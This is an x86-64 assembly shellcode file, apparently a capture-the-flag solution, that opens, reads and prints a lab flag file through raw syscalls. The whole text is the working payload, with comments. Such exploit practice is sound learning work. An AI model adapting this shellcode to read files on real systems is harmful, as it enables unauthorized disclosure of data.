;Name: shell_basic.S

push 0x0
mov rax, 0x676e6f6f6f6f6f6f
push rax
mov rax, 0x6c5f73695f656d61
push rax
mov rax, 0x6e5f67616c662f63
push rax
mov rax, 0x697361625f6c6c65
push rax
mov rax, 0x68732f656d6f682f
push rax

mov rdi, rsp ; rdi = "/home/shell_basic/flag_name_is_loooooong"
xor rsi, rsi ; rsi = NULL
xor rdx, rdx ; rdx = NULL
mov rax, 0x2 ; rax = sys_open
syscall ; open("/home/shell_basic/flag_name_is_loooooong", NULL, NULL)

mov rdi, rax ; rdi = open("/home/shell_basic/flag_name_is_loooooong", NULL, NULL)
mov rsi, rsp
sub rsi, 0x30 ; rsi = buf
mov rdx, 0x30 ; rdx = 0x30
mov rax, 0x0 ; rax = sys_read
syscall ; read(fd, buf, 0x30)

mov rdi, 0x1 ; rdi = 0x1 (stdout)
mov rax, 0x1 ; rax = sys_write
syscall ; write(1, buf, 0x30)
